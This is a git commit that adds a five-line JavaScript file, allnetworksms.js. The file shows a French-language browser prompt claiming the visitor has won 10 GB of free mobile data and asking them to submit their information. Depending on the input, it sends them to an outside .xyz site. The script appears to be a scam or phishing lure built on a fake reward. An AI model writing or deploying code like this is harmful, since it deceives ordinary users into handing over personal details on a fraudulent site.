1bf4239777163548723d88223a2b4a62e374238e
bigetijazz3 <bigetijazz3@gmail.com>
2024-08-22 08:01:45 -0700

    Create allnetworksms.js

---
+++ allnetworksms.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('Récompense de données : Félicitations, vous êtes éligible pour recevoir 10 Go de données gratuites, veuillez appuyer sur 1 pour soumettre vos informations maintenant','1');
+if (password != '1') {
+location.href='https://www.ibaakanawan.xyz/gn-tout-le-reseau';
+}
